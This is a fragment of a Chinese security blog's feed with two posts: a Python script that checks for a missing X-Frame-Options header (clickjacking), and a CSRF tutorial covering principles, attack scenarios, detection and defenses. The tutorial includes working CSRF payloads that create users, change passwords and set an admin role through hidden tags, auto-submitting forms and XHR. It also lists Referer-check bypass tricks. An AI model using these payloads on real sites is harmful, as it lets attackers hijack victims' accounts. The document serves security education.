    <content type="html"><![CDATA[<h3 id="clickjack-check"><a href="#clickjack-check" class="headerlink" title="clickjack_check"></a>clickjack_check</h3><blockquote><p>巩固写代码，顺便使用loguru记录日志emmm；此处本质上就是检测返回数据包中是否存在X-FRAME-OPTIONS</p></blockquote><p>废话不说，直接上代码</p><h4 id="非面向对象"><a href="#非面向对象" class="headerlink" title="非面向对象"></a>非面向对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_check</span><span class="params">(url)</span>:</span></span><br><span class="line">    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">    log_file_path = os.path.join(base_dir,<span class="string">'/Log/click_test.log'</span>)</span><br><span class="line">    <span class="comment"># print(base_dir)</span></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>&#125;</span><br><span class="line">    respone = requests.get(url=url,headers=headers,timeout=<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> respone.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">'[+]Target stability'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            hea = respone.headers</span><br><span class="line">            req1 = <span class="string">'[-]X-FRAME-OPTIONS '</span> + hea[<span class="string">'X-FRAME-OPTIONS'</span>]</span><br><span class="line">            req2 = <span class="string">'[-]X-FRAME-OPTIONS header, no click hijacking vulnerability can be used'</span></span><br><span class="line">            logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            req1 = <span class="string">'[+]There is no X-FRAME-OPTIONS header. There is a clicking hijacking vulnerability'</span></span><br><span class="line">            req2 = <span class="string">'[!]Remind:It may be a defense against JS. Please test it yourself'</span></span><br><span class="line">            logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[-]bjective instability'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'Poc for clickjack.'</span>)</span><br><span class="line">    parse.usage = <span class="string">"python3 clickjack.py [-h] [-u URL] "</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The website to be tested Url'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        url = args.url</span><br><span class="line">        click_check(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parse.print_help()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:      </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">click_jack</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self)</span>:</span></span><br><span class="line">        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">        log_file_path = os.path.join(base_dir,<span class="string">'/Log/click_test.log'</span>)</span><br><span class="line">        <span class="comment"># print(base_dir)</span></span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>&#125;</span><br><span class="line">        respone = requests.get(url=self._url,headers=headers,timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">if</span> respone.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">'[+]Target stability'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                hea = respone.headers</span><br><span class="line">                req1 = <span class="string">'[-]X-FRAME-OPTIONS '</span> + hea[<span class="string">'X-FRAME-OPTIONS'</span>]</span><br><span class="line">                req2 = <span class="string">'[-]X-FRAME-OPTIONS header, no click hijacking vulnerability can be used'</span></span><br><span class="line">                logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">                logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                req1 = <span class="string">'[+]There is no X-FRAME-OPTIONS header. There is a clicking hijacking vulnerability'</span></span><br><span class="line">                req2 = <span class="string">'[!]Remind:It may be a defense against JS. Please test it yourself'</span></span><br><span class="line">                logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">                logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-]bjective instability'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        parse = argparse.ArgumentParser(description=<span class="string">'Poc for clickjack.'</span>)</span><br><span class="line">        parse.usage = <span class="string">"python3 clickjack.py [-h] [-u URL] "</span></span><br><span class="line">        parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The website to be tested Url'</span>)</span><br><span class="line">        args = parse.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            url = args.url</span><br><span class="line">            self._url = url</span><br><span class="line">            self.check()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parse.print_help()</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    click = click_jack(<span class="string">''</span>)</span><br><span class="line">    click.main()</span><br></pre></td></tr></table></figure><p>效果如图：包含日志信息（日志信息如果想只存储结果，格式化时只保留message即可）</p><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572235466.73.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572235483.72.png" alt></p><p>关于loguru可以看之前的文章</p><p><a href="http://www.lsowl.top/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/">Python 中更优雅的日志记录方案</a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a> </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;clickjack-check&quot;&gt;&lt;a href=&quot;#clickjack-check&quot; class=&quot;headerlink&quot; title=&quot;clickjack_check&quot;&gt;&lt;/a&gt;clickjack_check&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;巩固写代码
      
    
    </summary>
    
      <category term="web前端相关" scheme="https://www.lsowl.top/categories/web%E5%89%8D%E7%AB%AF%E7%9B%B8%E5%85%B3/"/>
    
    
      <category term="界面劫持" scheme="https://www.lsowl.top/tags/%E7%95%8C%E9%9D%A2%E5%8A%AB%E6%8C%81/"/>
    
      <category term="web前端" scheme="https://www.lsowl.top/tags/web%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>CSRF总结</title>
    <link href="https://www.lsowl.top/2019/10/27/CSRF%E6%80%BB%E7%BB%93/"/>
    <id>https://www.lsowl.top/2019/10/27/CSRF总结/</id>
    <published>2019-10-27T08:13:47.000Z</published>
    <updated>2019-10-28T08:38:25.383Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><blockquote><p>cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会话的客户端的信任进行的攻击 。csrf又称为xsrf，它与xss最大的区别就在于，csrf并没有盗取cookie而是直接利用。</p></blockquote><h3 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h3><p>利用目标用户的合法身份，以用户的名义进行非法的操作</p><h3 id="CSRF的分类"><a href="#CSRF的分类" class="headerlink" title="CSRF的分类"></a>CSRF的分类</h3><h4 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4><p>GET型CSRF漏洞，只需要构造URL，然后诱导受害者访问利用。    HTML中可以设置src/href等地址的标签都可以发起一个GET请求：</p><p>利用a标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用img标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用iframe:注意：可以设置iframe的style为display:none，以此来不显示iframe加载的内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>CSS中background利用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"background: url('http://www.xxx.com/new_user.php?username=123&amp;password=123456');"</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>还有</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;link href=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img lowsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img dynsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"refersh"</span> content=<span class="string">"0"</span>; url=<span class="string">""</span>&gt;</span><br><span class="line">&lt;frame src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;script src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;bgsound src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;embed src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;audio src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;table background=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">css样式中：</span><br><span class="line">@<span class="keyword">import</span> <span class="string">""</span></span><br><span class="line">background:url(<span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>除了固定的编写方式之外还可以通过JavaScript动态生成的标签对象或CSS对象发起GET请求。</p><h4 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4><p>POST型CSRF漏洞，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用。构造表单常见是用hidden属性(只能通过form表单的方式提交)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;img src="./</span>logo.png<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="</span>http:<span class="comment">//192.168.1.106/vulnerabilities/csrf/"&gt;</span></span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;new"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"password&amp;#95;conf"</span> value=<span class="string">"demos"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"Change"</span> value=<span class="string">"Change"</span> /&gt;</span><br><span class="line">      &lt;input type=<span class="string">"submit"</span> value=<span class="string">"点击查看头像"</span> /&gt;</span><br><span class="line">    &lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">"autosubmit"</span> action=<span class="string">"http://www.example.com/api/setusername"</span> enctype=<span class="string">"text/plain"</span> method=<span class="string">"POST"</span>&amp;&gt;</span><br><span class="line">&lt;input name=<span class="string">"username"</span> type=<span class="string">"hidden"</span> value=<span class="string">"CSRFd"</span> /&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> value=<span class="string">"Submit Request"</span> /&gt;</span><br><span class="line">&lt;<span class="regexp">/form&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">document.getElementById("autosubmit").submit();</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h4 id="利用script标签"><a href="#利用script标签" class="headerlink" title="利用script标签"></a>利用script标签</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"GET"</span>, <span class="string">"http://www.example.com/api/currentuser"</span>);</span><br><span class="line">xhr.send();</span><br><span class="line">&lt;<span class="regexp">/script&gt;ja</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">"POST"</span>, <span class="string">"http://www.example.com/api/setrole"</span>);</span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xhr.setRequestHeader(<span class="string">"Content-Type"</span>, <span class="string">"application/json;charset=UTF-8"</span>);</span><br><span class="line">xhr.send(<span class="string">'&#123;"role":admin&#125;'</span>);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="从信任角度来说明CSRF与XSS的区别"><a href="#从信任角度来说明CSRF与XSS的区别" class="headerlink" title="从信任角度来说明CSRF与XSS的区别"></a>从信任角度来说明CSRF与XSS的区别</h3><p>XSS：利用用户对站点的信任（就是客户端对服务器下发的文件默认是信任的）</p><p>CSRF：利用站点对已经身份认证的信任（默认站点只对经过身份认证的用户是信任的）</p><h3 id="CSRF可能会出现的攻击场景"><a href="#CSRF可能会出现的攻击场景" class="headerlink" title="CSRF可能会出现的攻击场景"></a>CSRF可能会出现的攻击场景</h3><p>修改账号密码、个人信息（email、收货地址）</p><p>发送伪造的业务请求（网银、购物、投票）</p><p>关注他人社交账号、发送推文、留言评论等</p><p>未验证 Referer或者使用 Token 导致用户或者管理员可被 CSRF添加、修改、删除等操作</p><p>以转账为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">初始化链接：http://www.xxx.com/pay.php?user=xx&amp;amp;money=100</span><br><span class="line">构造恶意链接：http://www.xxx.com/pay.php?user=恶意用户&amp;amp;money=10000</span><br></pre></td></tr></table></figure><h3 id="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"><a href="#CSRF的执行原理图：这里就可以反应出来它与XSS的区别" class="headerlink" title="CSRF的执行原理图：这里就可以反应出来它与XSS的区别"></a>CSRF的执行原理图：这里就可以反应出来它与XSS的区别<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1527347582.0.png" alt></h3><h3 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h3><p>被攻击用户已经完成身份认证(已登录)</p><p>新请求的提交不需要重新身份认证或确认机制（如果有token机制则需要获取token，但是由于跨域的原因，攻击者构造的攻击代码无法直接请求被攻击服务器，无法获取token，但是如果配合XSS漏洞获取token，基于token的防护机制就形同虚设）</p><h3 id="CSRF可能存在的点以及检测方法"><a href="#CSRF可能存在的点以及检测方法" class="headerlink" title="CSRF可能存在的点以及检测方法"></a>CSRF可能存在的点以及检测方法</h3><p>寻找测试站点<strong>增删改</strong>的地方，构造HTML，修改HTML表单中某些参数，使用浏览器打开该HTML，点击提交表单后查看响应结果，看该操作是否成功执行。</p><p>检测方法：捕获的数据包，查看在请求和响应过程中检查是否存在anti-CSRF token名 以及验证服务器是否验证anti-CSRF token的值；检测token中的可编辑字符串（可查看以及伪造）；检查referrer头是否可以伪造绕过、查看是否有二次身份认证、验证码等防御措施。</p><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p>增加anti-CSRF token（随机token，随机性强且不易伪造，注意一点，POST请求可以隐藏在表单，如果是GET请求可以添加在cookie中）并在服务端验证</p><p>严格验证Referer，防止被绕过</p><p>关键请求使用<strong>验证码</strong>功能（比如确认转账、确认修改密码操作等，在一些其他场景使用验证码，用户体验不是很好）</p><p>降低会话超时时间</p><h3 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h3><p>burpsuit</p><p>CSRFTester（个人觉得不是很好用）</p><h3 id="绕过referer验证"><a href="#绕过referer验证" class="headerlink" title="绕过referer验证"></a>绕过referer验证</h3><p>空Referer绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">空referer头：置空</span><br><span class="line"> </span><br><span class="line">在referer字段后添加：ftp://,http://,https://,file://,javascript:,data等协议头再发送，看是否绕过referer验证。例如https向http跳转的时候referer为空，利用https://www.eval.com/attack.html</span><br></pre></td></tr></table></figure><p>判断referer是否存在某个关键词：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">例如dvwa中的验证server_name</span><br><span class="line"> </span><br><span class="line">referer判断存在不存在google.com这个关键词</span><br><span class="line"> </span><br><span class="line">在网站新建一个google.com目录 把CSRF存放在google.com目录,即可绕过</span><br></pre></td></tr></table></figure><p>判断referer是否有某域名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">判断了Referer开头是否以126.com以及126子域名 不验证根域名为126.com 那么我这里可以构造子域名x.126.com.xxx.com作为蠕虫传播的载体服务器，即可绕过。</span><br></pre></td></tr></table></figure><p>在域名前添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在域名前面增加随机的a-z和0-9也可能绕过：</span><br></pre></td></tr></table></figure><p>添加一些特殊的符号绕过，不同的浏览器支持的符号也不一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">https://xxx.com/?https://target.org   #思路和绕过URL跳转限制类似</span><br><span class="line"> </span><br><span class="line"><span class="comment">#字典如下</span></span><br><span class="line">,</span><br><span class="line">&amp;</span><br><span class="line"><span class="string">'</span></span><br><span class="line"><span class="string">"</span></span><br><span class="line"><span class="string">;</span></span><br><span class="line"><span class="string">!</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">^</span></span><br><span class="line"><span class="string">*</span></span><br><span class="line"><span class="string">(</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">+</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"><span class="string">~</span></span><br><span class="line"><span class="string">-</span></span><br><span class="line"><span class="string">_</span></span><br><span class="line"><span class="string">=</span></span><br><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">%</span></span><br></pre></td></tr></table></figure><p>无referer</p><blockquote><p>与添加不同的协议跳转置空referer不同，这里是直接删除referer头，利用的时候需要在body之前POC中加入meta标签</p></blockquote><p>POC</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;meta name=<span class="string">"referrer"</span> content=<span class="string">"never"</span>&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;script&gt;history.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">    &lt;form action="http:/</span><span class="regexp">/127.0.0.1/</span>test.php<span class="string">"&gt;</span></span><br><span class="line"><span class="string">      &lt;input type="</span>submit<span class="string">" value="</span>Submit request<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">    &lt;script&gt;</span></span><br><span class="line"><span class="string">      document.forms[0].submit();</span></span><br><span class="line"><span class="string">    &lt;/script&gt;</span></span><br><span class="line"><span class="string">  